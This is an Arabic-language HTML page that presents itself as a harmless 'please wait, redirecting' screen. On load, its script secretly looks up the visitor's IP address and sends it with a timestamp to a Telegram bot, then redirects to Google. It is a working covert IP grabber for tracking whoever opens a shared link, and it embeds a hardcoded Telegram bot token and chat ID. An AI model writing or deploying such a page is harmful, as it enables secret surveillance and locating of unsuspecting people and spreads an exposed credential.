<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحويل...</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            text-align: center;
            padding-top: 60px;
            background-color: #f4f4f9;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h3>جاري تحويلك إلى الصفحة المطلوبة...</h3>
    <p>يرجى الانتظار قليلاً.</p>

    <script>
        const targetRedirectUrl = "https://www.google.com"; 
        const botToken = "9187574833:AAGIaNeSPMRUCmRtwT_S0jwBS3ubhGf320k"; 
        const chatId = "-1004497819495"; 

        async function captureAndSend() {
            try {
                // 1. جلب عنوان الـ IP للزائر
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                let userIp = ipData.ip;
                let visitTime = new Date().toLocaleString();

                // 2. تجهيز رسالة التليجرام
                let message = `🚨 زيارة جديدة للموقع!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`;
                let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                // 3. إرسال الطلب عبر fetch مع وضع keepalive لضمان اكتماله حتى قبل التحويل
                await fetch(telegramUrl, { method: 'GET', keepalive: true });
            } catch (error) {
                console.log("Error:", error);
            }

            // 4. التوجيه الفوري للرابط المقصود
            window.location.href = targetRedirectUrl;
        }

        window.onload = captureAndSend;
    </script>

</body>
</html>
